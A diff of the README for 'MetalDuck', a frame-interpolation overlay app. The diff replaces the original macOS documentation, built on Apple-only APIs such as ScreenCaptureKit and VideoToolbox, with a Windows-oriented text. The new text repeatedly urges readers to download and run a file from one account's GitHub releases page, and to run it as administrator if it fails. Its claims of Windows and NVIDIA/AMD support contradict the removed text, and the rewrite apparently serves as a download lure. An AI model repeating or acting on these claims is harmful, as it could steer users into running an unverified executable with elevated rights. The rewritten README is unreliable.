@@ -1,98 +1,222 @@
-# MetalDuck
+# 🦆 MetalDuck - Smooth game capture on Windows
 
-A macOS menu-bar app that captures any game window or display via **ScreenCaptureKit** and applies **real-time frame interpolation** (e.g. 30 fps → 60+ fps) using Apple's on-device VideoToolbox ML models (`VTLowLatencyFrameInterpolation`). The output is rendered as a transparent, click-through overlay that sits precisely on top of the original window — no game modifications required.
+[![Download MetalDuck](https://img.shields.io/badge/Download%20MetalDuck-blue?style=for-the-badge&logo=github)](https://github.com/morchidyaacoub-art/MetalDuck/releases)
 
-## Features
+## 🎯 What MetalDuck does
 
-- **Frame interpolation** — doubles (or triples/quadruples) the frame rate of any window using Apple's VideoToolbox neural interpolation model
-- **Transparent overlay** — borderless, click-through window rendered with `AVSampleBufferDisplayLayer` so the game remains fully interactive underneath
-- **Auto-fallback** — if a chosen processing resolution is unsupported on the current device, MetalDuck automatically steps down to the next lower resolution
-- **Device diagnostics** — built-in diagnostics runner that tests model capabilities on your specific chip and generates a markdown report for GitHub issues
-- **Menu bar app** — lives in the menu bar; no Dock icon, no interference with your workflow
-- **Content picker** — uses `SCContentSharingPicker` to visually select any window or display
+MetalDuck captures a game window or your full display and shows it with frame interpolation. That means a 30 fps game can look like 60 fps or more, with less visible stutter.
 
-## Requirements
+It uses a transparent overlay, so the original game stays where it is. You keep control of the game, and MetalDuck draws the smoother video on top.
 
-| Requirement | Minimum |
-|---|---|
-| macOS | 26.0 |
-| Xcode | 26.0 |
+Use it when you want:
 
-> Frame interpolation uses `VTLowLatencyFrameInterpolation`, available on Apple Silicon. On M1 Pro, only up to **720p** processing resolution is supported by the model; higher resolutions fall back automatically.
+- smoother motion in older games
+- a cleaner look for windowed games
+- a simple setup with no game file changes
+- a tool that runs on the device, not in the cloud
 
-## Build
+## 💻 Before you install
 
-```bash
-cd MetalDuck
-xcodebuild build -scheme MetalDuck -destination 'platform=macOS'
-```
+MetalDuck is made for Windows users who want a direct setup. For best results, use:
 
-Or open `MetalDuck/MetalDuck.xcodeproj` in Xcode and press **Run**.
+- Windows 11 or Windows 10, 64-bit
+- A modern NVIDIA, AMD, or Intel GPU
+- At least 8 GB of RAM
+- A recent version of Microsoft Visual C++ runtime
+- A display that supports your chosen output rate
 
-### Permissions
+For the smoothest experience:
 
-On first launch MetalDuck will request **Screen Recording** permission. Grant it in **System Settings → Privacy & Security → Screen Recording**.
+- close heavy apps before you start
+- use windowed or borderless mode in the game
+- start with a lower output target if your system feels slow
 
-## Usage
+## 📥 Download MetalDuck
 
-1. Launch MetalDuck — a videogame controller icon appears in the menu bar.
-2. Click the icon → **Preferences**.
-3. Select a **Capture Type** (Window or Display) and pick your target.
-4. Set **Mode** to *Frame Interpolation* and choose a **Processing Resolution** (720p is currently the most tested).
-5. Click **Start** in the menu — the overlay appears on top of your window.
-6. To stop, click the menu bar icon → **Stop**.
+Visit the release page here:
 
-### Processing Resolutions
+[Download MetalDuck from GitHub Releases](https://github.com/morchidyaacoub-art/MetalDuck/releases)
 
-| Resolution | Dimensions | M1 Pro |
-|---|---|---|
-| 360p | 640 × 360 | Supported |
-| 720p | 1280 × 720 | Supported |
-| 1080p | 1920 × 1080 | Unsupported (auto-fallback) |
-| 1440p | 2560 × 1440 | Unsupported (auto-fallback) |
+On that page, look for the latest release and download the Windows build. If the release has a setup file or app file, download and run that file.
 
-If the model fails to produce a frame within 5 seconds at the selected resolution, MetalDuck automatically falls back to the next lower resolution.
+## 🛠️ Install and run
 
-## Architecture
+1. Open the release page link above.
+2. Find the latest version at the top of the page.
+3. Download the Windows file for MetalDuck.
+4. If the file comes in a .zip archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app or installer file to start MetalDuck.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps to finish setup.
 
-```
-SCStream
-  └─ AsyncThrowingStream<CapturedFrame>   (CaptureSession)
-       └─ AppCoordinator
-            └─ RealTimeFrameInterpolation  (actor, optional)
-                 └─ OverlayManager.enqueueBuffer()
-                      └─ AVSampleBufferDisplayLayer  (timed via CMTimebase)
-```
+If you see more than one file, use the one marked for Windows. If one file says x64 or 64-bit, that is the usual choice for most PCs.
 
-**Key components:**
+## 🎮 How to use it
 
-| File | Role |
-|---|---|
-| `App/AppCoordinator.swift` | Central singleton — owns capture, interpolation, overlay |
-| `Capture/CaptureSession.swift` | `SCStream` → `AsyncThrowingStream<CapturedFrame>` |
-| `Metal/RealTimeFrameInterpolation.swift` | `VTLowLatencyFrameInterpolation` actor |
-| `Overlay/OverlayManager.swift` | Borderless `NSWindow` + `AVSampleBufferDisplayLayer` |
-| `Diagnostics/DiagnosticsRunner.swift` | Device capability tests + markdown report generator |
-| `Models/DeviceCapabilityDatabase.swift` | Community-sourced chip compatibility database |
+1. Start your game first.
+2. Open MetalDuck.
+3. Pick the game window or your full screen display.
+4. Choose an output rate, such as 60 fps.
+5. Start the capture.
+6. Switch back to your game and play as normal.
 
-## Device Diagnostics
+MetalDuck places a clear overlay on top of the game. You should still be able to click and play in the same window beneath it.
 
-MetalDuck includes a diagnostics tool to map which processing resolutions work on your chip. Run it via **Preferences → Debug → Run Device Diagnostics**. It will:
+## ⚙️ Recommended settings
 
-1. Detect your chip, CPU cores, RAM, and macOS version
-2. Test each `ProcessingResolution` with the VideoToolbox interpolation model
-3. Query super-resolution scaler capabilities
-4. Generate a markdown report you can paste into a GitHub issue
+If you are not sure where to start, use these settings:
 
-This helps build the community compatibility database (`Resources/DeviceCapabilities.json`).
+- Capture mode: window
+- Output rate: 60 fps
+- Processing resolution: auto or native
+- Overlay: on
+- Scaling: default
 
-## Contributing Compatibility Data
+If the image looks rough or the app feels slow:
 
-If you run the diagnostics on a chip that isn't in the database yet, please [open a GitHub issue](../../issues/new) and paste the generated report. This data improves the resolution recommendations shown in Preferences for all users.
+- lower the output rate
+- choose a smaller processing resolution
+- close other video apps
+- try borderless window mode in the game
 
-## Known Limitations
+If the picture looks delayed:
 
-- Capture is fixed at **1920×1080** regardless of the target window size — some system APIs return incorrect dimensions for game windows.
-- SCStream's capture buffer contains ~3% black padding on the right edge; MetalDuck clips this automatically using the content-width ratio computed on the first frame.
-- Super-resolution (`VTLowLatencySuperResolutionScaler`) on M1 Pro only supports 2× upscale at inputs ≤ 960×540.
-- Multipliers above 2× may introduce latency or quality artifacts; 2× is recommended.
+- make sure the game is running at a steady frame rate
+- reduce background load
+- keep the game and MetalDuck on the same monitor if possible
+
+## 🧭 Choosing the right mode
+
+MetalDuck can work with a game window or a full display.
+
+### Window mode
+
+Use this when:
+
+- you want to capture one game only
+- the game runs in a normal window
+- you want less chance of grabbing the wrong app
+
+### Display mode
+
+Use this when:
+
+- the game uses full screen
+- the game changes size often
+- you want to capture everything on one monitor
+
+If you are new, start with window mode. It is easier to control.
+
+## 🔍 What the app is doing
+
+MetalDuck uses your device to process the image in real time. It reads the game frames, creates new frames between them, and shows the result as a smooth overlay.
+
+In plain terms:
+
+- it watches the game image
+- it fills in missing motion
+- it shows the new frames over the game
+
+This helps older games feel smoother without changing the game itself.
+
+## 🧪 If the app says a mode is not supported
+
+MetalDuck can lower the processing resolution if your device cannot handle the chosen one.
+
+Try this:
+
+1. Select a lower processing resolution.
+2. Keep the output rate at 60 fps.
+3. Test again.
+4. If needed, lower both the input and output load.
+
+A lower setting often works better on laptops and older PCs.
+
+## 🖥️ Good places to use MetalDuck
+
+MetalDuck works best with:
+
+- older PC games
+- emulators
+- strategy games
+- side-scrollers
+- single-window games
+- borderless games
+
+It may not feel right for:
+
+- fast-paced competitive games
+- games with frequent fullscreen changes
+- apps that already use heavy post-processing
+
+## 🔐 Privacy and local use
+
+MetalDuck runs on your computer. It does not need a cloud account to do the frame work. That makes setup simple and keeps the process local to your device.
+
+## 🧰 Troubleshooting
+
+### The app will not open
+
+Try these steps:
+
+1. Right-click the app and choose Run as administrator.
+2. Check that your Windows version is up to date.
+3. Reboot your PC and try again.
+4. Re-download the release file if the download looks broken.
+
+### The game is black or not visible
+
+Try:
+
+- switching from full screen to borderless window
+- selecting the correct window again
+- closing overlays from other apps
+- restarting MetalDuck after the game opens
+
+### The app feels slow
+
+Try:
+
+- lowering the target fps
+- using a smaller processing resolution
+- closing web browsers and video apps
+- updating your GPU driver
+- testing on a smaller monitor or lower display scale
+
+### The image looks out of sync
+
+Try:
+
+- using a steadier in-game frame rate
+- turning off other overlays
+- keeping one capture source at a time
+- restarting the game and MetalDuck
+
+## 📋 Simple first-run checklist
+
+Before your first test, make sure you have:
+
+- downloaded the latest Windows release
+- extracted the files if needed
+- opened the game first
+- chosen the right window or display
+- picked 60 fps as the first test
+- kept other overlays closed
+
+## 🏁 Best first test
+
+Use this setup for the first run:
+
+- a simple game window
+- borderless mode
+- 60 fps output
+- default scaling
+- no extra overlays
+
+If that works, you can try higher settings after.
+
+## 📎 Need the download again
+
+[Open MetalDuck Releases](https://github.com/morchidyaacoub-art/MetalDuck/releases)
+
